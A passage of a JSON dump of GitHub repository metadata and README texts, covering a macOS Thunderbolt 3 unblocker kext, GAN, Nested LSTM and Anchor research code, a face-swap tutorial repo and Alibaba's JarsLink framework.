totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":59},"websiteUrl":"http://rgov.org/"},"repository":{"name":"Thunderbolt3Unblocker","primaryLanguage":{"name":"C"},"license":"Other","isArchived":false,"hasWikiEnabled":true,"forkCount":1,"readme_md":{"text":"# Thunderbolt 3 Unblocker\n\nThis project provides a kernel extension that unblocks unsupported Thunderbolt\n3 peripherals (such as the Razer Core) on macOS.\n\nThis accomplishes the same goal as [KhaosT's TB3 Enabler][tb3-enabler], which\nworks by patching IOThunderboltFamily on disk. This kernel extension performs\nthe patch in memory and on-the-fly.\n\n[tb3-enabler]: https://github.com/KhaosT/tb3-enabler\n\nNote there is likely a reason why IOThunderboltFamily considers a peripheral\nunsupported in the first place. Use at your own peril.\n\n## Installation\n\nTo prepare your development environment, please run\n\n    git submodule update --init --recursive\n    brew install autoconf automake libtool\n\nIt is recommended to keep System Integrity Protection on. To lower security\njust enough to allow this kernel extension to be loaded without code signing, \nuse `csrutil enable --without kext`\n\nBuild the project with Xcode. Make sure to change code signing settings as\nappropriate.\n\n    sudo chown -R root:wheel Thunderbolt3Unblocker.kext\n    sudo kextload Thunderbolt3Unblocker.kext\n\n\n## `xnu_override`\n\nThis project also implements a simple, reusable in-memory kernel patching\nlibrary. The author has released it under a permissive license in the hopes\nthat it will be useful.\n","byteSize":1271},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":112},"createdAt":"2018-02-02T11:49:37Z","updatedAt":"2018-02-15T20:46:26Z","pushedAt":"2018-02-16T06:59:36Z","description":null,"subscribersCount":{"totalCount":8},"diskUsage":46,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":28},"participants":{"totalCount":5}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":19},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":25}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"pfnet-research","repositories":{"totalCount":15},"location":null,"members":{"totalCount":7},"websiteUrl":null},"repository":{"name":"sngan_projection","primaryLanguage":{"name":"Python"},"license":"Other","isArchived":false,"hasWikiEnabled":true,"forkCount":15,"readme_md":{"text":"[//]: <links>\n[sngans]: https://openreview.net/forum?id=B1QRgziT-\n[pcgans]: https://openreview.net/forum?id=ByS1VpgRZ\n\n# GANs with spectral normalization and projection discriminator\n*NOTE: The setup and example code in this README are for training GANs on **single GPU**.*\n*The models are smaller than the ones used in the [papers](https://github.com/pfnet-research/sngan_projection/#references).*\n*Please go to [**link**](https://github.com/pfnet-research/sngan_projection/blob/master/README_paper.md) if you are looking for how to reproduce the results in the papers.* \n\n<img src=\"https://github.com/pfnet-research/sngan_projection/blob/master/demo/dog_and_cat_1x1_long.gif\" width=\"128\">\n\nOfficial Chainer implementation for conditional image generation on ILSVRC2012 dataset (ImageNet) with [spectral normalization][sngans] and [projection discrimiantor][pcgans]. \n\n### Demo movies\n\nConsecutive category morphing movies:\n- (5x5 panels 128px images) https://www.youtube.com/watch?v=q3yy5Fxs7Lc  \n- (10x10 panels 128px images) https://www.youtube.com/watch?v=83D_3WXpPjQ\n\n### Other materials\n- [Generated images](https://drive.google.com/drive/folders/1ZzQctZ-loDf9wHJHX90xNN02-_BCYtB-?usp=sharing)\n  - from the model trained on all ImageNet images (1K categories): [[128px]](https://drive.google.com/drive/folders/1Mr-fYW0-9QbwKYlIaiFUtgcN6n9qhY8l?usp=sharing)\n  - from the model trained on dog and cat images (143 categories): [[64px]](https://drive.google.com/drive/folders/1RVJCDrSSHaoHKiSP9iCaiiimQoq42rQu?usp=sharing) [[128px]](https://drive.google.com/drive/folders/1yA3xWJqWRvhnhkvJsKF3Xbb-2LO4JrJw?usp=sharing) [[256px]](https://drive.google.com/drive/folders/1ejixDbK5gMtuPltr8kY_dIqMwsqGzt6a?usp=sharing)\n- [Pretrained models](https://drive.google.com/drive/folders/1xZoL48uFOCnTxNGdknEYqE5YX0ZyoUej?usp=sharing)\n- [Movies](https://drive.google.com/drive/folders/1yhV8_VbOcs2rkiMTstO4RHqp4YRnzg6c?usp=sharing)\n- 4 corners category morph.\n\n<img src=\"https://github.com/pfnet-research/sngan_projection/blob/master/demo/interpolated_images_4.png\" width=\"432\"> <img src=\"https://github.com/pfnet-research/sngan_projection/blob/master/demo/interpolated_images_24.png\" width=\"432\">\n\n### References\n- Takeru Miyato, Toshiki Kataoka, Masanori Koyama, Yuichi Yoshida. *Spectral Normalization for Generative Adversarial Networks*. ICLR2018. [OpenReview][sngans]\n- Takeru Miyato, Masanori Koyama. *cGANs with Projection Discriminator*. ICLR2018. [OpenReview][pcgans]\n\n## Setup\n\n### Install required python libraries:\n\n`pip install -r requirements.txt`\n### Download ImageNet dataset:\nPlease download ILSVRC2012 dataset from http://image-net.org/download-images\n\n### Preprocess dataset:\n```\ncd datasets\nIMAGENET_TRAIN_DIR=/path/to/imagenet/train/ # path to the parent directory of category directories named \"n0*******\".\nPREPROCESSED_DATA_DIR=/path/to/save_dir/\nbash preprocess.sh $IMAGENET_TRAIN_DIR $PREPROCESSED_DATA_DIR\n# Make the list of image-label pairs for all images (1000 categories, 1281167 images).\npython imagenet.py $PREPROCESSED_DATA_DIR\n# Make the list of image-label pairs for dog and cat images (143 categories, 180373 images). \npython imagenet_dog_and_cat.py $PREPROCESSED_DATA_DIR\n```\n### Download inception model: \n\n`python source/inception/download.py --outfile=datasets/inception_model`\n\n## Training examples\n\n### Spectral normalization + projection discriminator for 64x64 dog and cat images:\n```\nLOGDIR=/path/to/logdir\nCONFIG=configs/sn_projection_dog_and_cat_64.yml\npython train.py --config=$CONFIG --results_dir=$LOGDIR --data_dir=$PREPROCESSED_DATA_DIR\n```\n- [pretrained model](https://drive.google.com/drive/folders/1KfhQo84fvWUtYQlRVAWf0nswf6X1nawh?usp=sharing)\n- [generated images at 250K iterations](https://drive.google.com/drive/u/1/folders/1RVJCDrSSHaoHKiSP9iCaiiimQoq42rQu)\n- Examples of 64x64 generated images:\n<img src=\"https://github.com/pfnet-research/sngan_projection/blob/master/demo/images_dog_and_cat_64.jpg\">\n\n### Spectral normalization + projection discriminator for 64x64 all ImageNet images:\n```\nLOGDIR=/path/to/logdir\nCONFIG=configs/sn_projection_64.yml\npython train.py --config=$CONFIG --results_dir=$LOGDIR --data_dir=$PREPROCESSED_DATA_DIR\n```\n\n## Evaluation\n### Calculate inception score (with the original OpenAI implementation)\n```\npython evaluations/calc_inception_score.py --config=$CONFIG --snapshot=${LOGDIR}/ResNetGenerator_<iterations>.npz --results_dir=${LOGDIR}/inception_score --splits=10 --tf\n```\n\n### Generate images and save them in `${LOGDIR}/gen_images`\n```\npython evaluations/gen_images.py --config=$CONFIG --snapshot=${LOGDIR}/ResNetGenerator_<iterations>.npz --results_dir=${LOGDIR}/gen_images\n```\n\n\n","byteSize":4672},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":160},"createdAt":"2018-02-02T09:35:34Z","updatedAt":"2018-02-17T05:34:28Z","pushedAt":"2018-02-14T13:34:20Z","description":"GANs with spectral normalization and projection discriminator","subscribersCount":{"totalCount":19},"diskUsage":5907,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":21}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"hannw","followers":{"totalCount":16},"repositories":{"totalCount":6},"following":{"totalCount":0},"location":"United States","organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":"https://hannw.github.io/"},"repository":{"name":"nlstm","primaryLanguage":{"name":"Python"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":12,"readme_md":{"text":"# nlstm\n## Tensorflow Implementation of Nested LSTM Cell\n\nHere is a tensorflow implementation of Nested LSTM cell.\n\n| ![nlstm architecture](img/nlstm_architecture.png) |\n|:--:| \n| *Nested LSTM Architecture. Courtesy of Moniz et al.* |\n\nNLSTM cell is basically a LSTM-like cell that uses the cell memory to control the state of the inner LSTM, and as such, the architecture can be generalized to multiple layers. For a comparison between LSTM and NLSTM,\n\n| ![lstm vs nlstm](img/lstm_vs_nlstm.png) |\n|:--:| \n| *LSTM and stacked LSTM, versus nested LSTM. Courtesy of Moniz et al.* |\n\nThe implementation  here is compatible with the tensorflow rnn API.\n\n```python\nfrom rnn_cell import NLSTMCell\ncell = NLSTMCell(num_units=3, depth=2)\ninit_state = cell.zero_state(batch_size, dtype=tf.float32)\noutput, new_state = cell(inputs, state=init_state)\n...\n```\n\nRef:\n- Moniz et al, \"Nested LSTMs.\" https://arxiv.org/abs/1801.10308\n\n","byteSize":919},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":179},"createdAt":"2018-02-02T07:04:16Z","updatedAt":"2018-02-14T13:54:50Z","pushedAt":"2018-02-12T00:38:49Z","description":"Nested LSTM Cell","subscribersCount":{"totalCount":6},"diskUsage":179,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":5}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":10}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"marcotcr","followers":{"totalCount":189},"repositories":{"totalCount":20},"following":{"totalCount":0},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":1},"websiteUrl":"http://homes.cs.washington.edu/~marcotcr/"},"repository":{"name":"anchor","primaryLanguage":{"name":"Jupyter Notebook"},"license":"BSD 2-Clause \"Simplified\" License","isArchived":false,"hasWikiEnabled":true,"forkCount":9,"readme_md":{"text":"# Anchor\nThis repository has code for the paper [*High-Precision Model-Agnostic Explanations*](https://homes.cs.washington.edu/~marcotcr/aaai18.pdf).\n\nAn anchor explanation is a rule that sufficiently “anchors” the\nprediction locally – such that changes to the rest of the feature\nvalues of the instance do not matter. In other words, for instances on which the anchor holds, the prediction is (almost)\nalways the same.\n\nAt the moment, we support explaining individual predictions for text classifiers or classifiers that act on tables (numpy arrays of numerical or categorical data). If there is enough interest, I can include code and examples for images.\n\nThe anchor method is able to explain any black box classifier, with two or more classes. All we require is that the classifier implements a function that takes in raw text or a numpy array and outputs a prediction (integer)\n\n## Installation\nThe lime package is on pypi. Simply run:\n\n    pip install anchor_exp\nOr clone the repository and run:\n\n    python setup.py install\n\n#### Examples\nSee notebooks folder for tutorials.\n\n- [Tabular data](https://github.com/marcotcr/anchor/blob/master/notebooks/Anchor%20on%20tabular%20data.ipynb)\n- [Text data](https://github.com/marcotcr/anchor/blob/master/notebooks/Anchor%20for%20text.ipynb)\n","byteSize":1297},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":190},"createdAt":"2018-02-02T23:38:50Z","updatedAt":"2018-02-16T22:39:36Z","pushedAt":"2018-02-04T13:52:50Z","description":"Code for \"High-Precision Model-Agnostic Explanations\" paper","subscribersCount":{"totalCount":11},"diskUsage":7595,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":3},"issuesClosed":{"totalCount":3},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":6}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"llSourcell","followers":{"totalCount":13274},"repositories":{"totalCount":258},"following":{"totalCount":4},"location":"San Francisco, CA","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":31},"websiteUrl":"www.youtube.com/c/sirajraval"},"repository":{"name":"deepfakes","primaryLanguage":{"name":"Python"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":95,"readme_md":{"text":"# Coding Challenge - Due Date, Thursday Feb 15 2018 \n\nGenerate your own faceswap using this algorithm. Post your github link with your code in the youtube comment section of [this](https://youtu.be/7XchCsYtYMQ) video. Bonus points if you document your code so that a beginner can do this easily (easier than this code). \n\n## Overview\n\nThis is the code for [this](https://youtu.be/7XchCsYtYMQ) video on Youtube by Siraj Raval.\n\n**Notice:** This repository is not operated or maintained by [/u/deepfakes](https://www.reddit.com/user/deepfakes/). Please read the explanation below for details.\n\n---\n\n# deepfakes_faceswap\n\nFaceswap is a tool that utilizes deep learning to recognize and swap faces in pictures and videos.\n\n## Overview\nThe project has multiple entry points. You will have to:\n - Gather photos (or use the one provided in the training data provided below)\n - **Extract** faces from your raw photos\n - **Train** a model on your photos (or use the one provided in the training data provided below)\n - **Convert** your sources with the model\n\n### Extract\nFrom your setup folder, run `python faceswap.py extract`. This will take photos from `src` folder and extract faces into `extract` folder.\n\n### Train\nFrom your setup folder, run `python faceswap.py train`. This will take photos from two folders containing pictures of both faces and train a model that will be saved inside the `models` folder.\n\n### Convert\nFrom your setup folder, run `python faceswap.py convert`. This will take photos from `original` folder and apply new faces into `modified` folder.\n\n#### General notes:\n- All of the scripts mentioned have `-h`/`--help` options with a arguments that they will accept. You're smart, you can figure out how this works, right?!\n\nNote: there is no conversion for video yet. You can use MJPG to convert video into photos, process images, and convert images back to video\n\n## Training Data  \n**Whole project with training images and trained model (~300MB):**  \nhttps://anonfile.com/p7w3m0d5be/face-swap.zip or [click here to download](https://anonfile.com/p7w3m0d5be/face-swap.zip)\n\n## How To setup and run the project\n\n### Setup \n\nClone the repo and setup you environment. There is a Dockerfile that should kickstart you. Otherwise you can setup things manually, see in the Dockerfiles for dependencies.\n\nCheck out [../blob/master/INSTALL.md](INSTALL.md) and [../blob/master/USAGE.md](USAGE.md) for basic information on how to configure virtualenv and use the program.\n\nYou also need a modern GPU with CUDA support for best performance\n\n**Some tips:**\n\nReusing existing models will train much faster than starting from nothing.  \nIf there is not enough training data, start with someone who looks similar, then switch the data.\n\n#### Docker\nIf you prefer using Docker, You can start the project with:\n - Build: `docker build -t deepfakes .`\n - Run: `docker run --rm --name deepfakes -v [src_folder]:/srv -it deepfakes bash` . `bash` can be replaced by your command line \nNote that the Dockerfile does not have all good requirments, so it will fail on some python 3 commands.\nAlso note that it does not have a GUI output, so the train.py will fail on showing image. You can comment this, or save it as a file.\n\n## How to contribute\n\n### For people interested in the generative models\n - Go to the 'faceswap-model' to discuss/suggest/commit alternatives to the current algorithm.\n\n### For devs\n - Read this README entirely\n - Fork the repo\n - Download the data with the link provided below\n - Play with it\n - Check issues with the 'dev' tag\n - For devs more interested in computer vision and openCV, look at issues with the 'opencv' tag. Also feel free to add your own alternatives/improvments\n \n### For non-dev advanced users\n - Read this README entirely\n - Clone the repo\n - Download the data with the link provided below\n - Play with it\n - Check issues with the 'advuser' tag\n - Also go to the 'faceswap-playground' repo and help others.\n\n### For end-users\n - Get the code here and play with it if you can\n - You can also go to the 'faceswap-playground' repo and help or get help from others.\n - Be patient. This is relatively new technology for developers as well. Much effort is already being put into making this program easy to use for the average user. It just takes time!\n - **Notice** Any issue related to running the code has to be open in the 'faceswap-playground' project!\n\n### For haters\nSorry no time for that\n\n# About github.com/deepfakes\n\n## What is this repo?\nIt is a community repository for active users.\n\n## Why this repo?\nThe joshua-wu repo seems not active. Simple bugs like missing _http://_ in front of url has not been solved since days.\n\n## Why is it named 'deepfakes' if it is not /u/deepfakes?\n 1. Because a typosquat would have happened sooner or later as project grows\n 2. Because all glory go to /u/deepfakes\n 3. Because it will better federate contributors and users\n \n## What if /u/deepfakes feels bad about that?\nThis is a friendly typosquat, and it is fully dedicated to the project. If /u/deepfakes wants to take over this repo/user and drive the project, he is welcomed to do so (Raise an issue, and he will be contacted on Reddit). Please do not send /u/deepfakes messages for help with the code you find here.\n\n# About machine learning\n\n## How does a computer know how to recognise/shape a faces? How does machine learning work? What is a neural network?\n\nIt's complicated. Here's a good video that makes the process understandable:\n[![How Machines Learn](https://img.youtube.com/vi/R9OHn5ZF4Uo/0.jpg)](https://www.youtube.com/watch?v=R9OHn5ZF4Uo)\n\nHere's a slightly more in depth video that tries to explain the basic functioning of a neural network:\n[![How Machines Learn](https://img.youtube.com/vi/aircAruvnKk/0.jpg)](https://www.youtube.com/watch?v=aircAruvnKk)\n\ntl;dr: training data + trial and error\n\n## Credits \n\nCredit goes to [deepfakes](https://github.com/deepfakes/faceswap). \n","byteSize":5940},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":197},"createdAt":"2018-02-02T11:46:21Z","updatedAt":"2018-02-17T03:36:28Z","pushedAt":"2018-02-02T11:51:26Z","description":"This is the code for \"DeepFakes\" by Siraj Raval on Youtube ","subscribersCount":{"totalCount":20},"diskUsage":33,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":3}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"alibaba","repositories":{"totalCount":187},"location":"Hangzhou, China","members":{"totalCount":118},"websiteUrl":"http://www.alibaba.com"},"repository":{"name":"jarslink","primaryLanguage":{"name":"Java"},"license":"Apache License 2.0","isArchived":false,"hasWikiEnabled":true,"forkCount":69,"readme_md":{"text":"[![Build Status](https://travis-ci.org/alibaba/jarslink.svg?branch=master)](https://travis-ci.org/alibaba/jarslink)\n[![Coverage Status](https://coveralls.io/repos/github/alibaba/jarslink/badge.svg?branch=master)](https://coveralls.io/github/alibaba/jarslink?branch=master)\n[![Maven Central](https://maven-badges.herokuapp.com/maven-central/com.alicp.jetcache/jetcache-parent/badge.svg)](https://maven-badges.herokuapp.com/maven-central/com.alicp.jetcache/jetcache-parent/)\n[![License](https://img.shields.io/badge/license-Apache%202-4EB1BA.svg)](https://www.apache.org/licenses/LICENSE-2.0.html)\n\n\nJarsLink (原名Titan) 是一个基于JAVA的模块化开发框架，它提供在运行时动态加载模块（一个JAR包）、卸载模块和模块间调用的API。\n\n# 需求背景\n\n- 应用拆分的多或少都有问题。多则维护成本高，每次发布一堆应用。少则拆分成本高，无用功能很难下线。\n- 故障不隔离。当一个系统由多人同时参与开发时，修改A功能，可能会影响B功能，引发故障。\n- 多分支开发引发冲突。多分支开发完之后合并会产生冲突。\n- 牵一发动全身。一处核心代码的改动，或一个基础Jar的升级需要回归整个系统。\n- 升级和迁移成本高。中间件升级每个应用都有升级成本。\n\n\n# 模块化开发的好处\n\n![](http://ifeve.com/wp-content/uploads/2017/08/Snip20170806_31.png)\n\n- 可插拔，一个应用由多个模块组成，应用里的模块可拆和合，模块可快速在多个系统中迁移和部署。\n- 模块化开发，模块之间互相隔离，实现故障隔离。\n- 一个模块一个分支，不会引发代码冲突。\n- 在模块中增加或修改功能，只会影响当前模块，不会影响整个应用。\n- 动态部署，在运行时把模块部署到应用中，快速修复故障，提高发布效率。\n- 多版本部署，可以在运行时同时部署某个模块的新旧版本，进行AB TEST。\n- 减少资源消耗，通过部署模块的方式减少应用数量和机器数量。\n\n# JarsLink的应用场景\n\n- 微服务集成测试, 目前一个微服务是一个FAT JAR,如果有几十个微服务,则需要启动很多进程,DEBUG端口会很多,使用JarsLink框架合并FAT JAR,再路由请求到其他JAR,就可以只启动一个进程进行DEBUG测试。\n- 数据管理中心，数据采集的数据源多，而且每种数据源都需要对接和开发，通过模块化开发，实现一个数据源使用一个模块进行对接。\n- 指标计算系统，每个TOPIC一个模块，把消息转发到模块中进行消息处理。\n- 后台管理系统，几乎每个系统都有后台开发的需求，新建应用则应用数多，维护成本高，引入模块化开发，一个二级域一个模块来开发后台功能。\n\n目前蚂蚁金服微贷事业部几个系统和几十个模块已经使用JarsLink框架。\n\n# 文档\n\n- [如何使用](https://github.com/alibaba/taitan/wiki/如何使用)\n- [实现原理](https://github.com/alibaba/taitan/wiki/实现原理)\n\n# 下载\n\n- [1.5.0.20171107版本](http://ifeve.com/wp-content/uploads/2018/02/jarslink.zip)\n\n\n# *License*\n\nJarsLink is released under the [Apache 2.0 license](https://github.com/alibaba/jarslink/blob/master/LICENSE).\n\n```\nCopyright 1999-2017 Alibaba Group Holding Ltd.\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at following link.\n\n     http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n","byteSize":3876},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":443},"createdAt":"2018-02-02T06:02:09Z","updatedAt":"2018-02-14T08:00:07Z","pushedAt":"2018-02-09T08:52:53Z","description":"模块化开发框架","subscribersCount":{"totalCount":34},"diskUsage":159,"pullRequestsOpen":{"totalCount":1},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}}]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":3},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":43}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":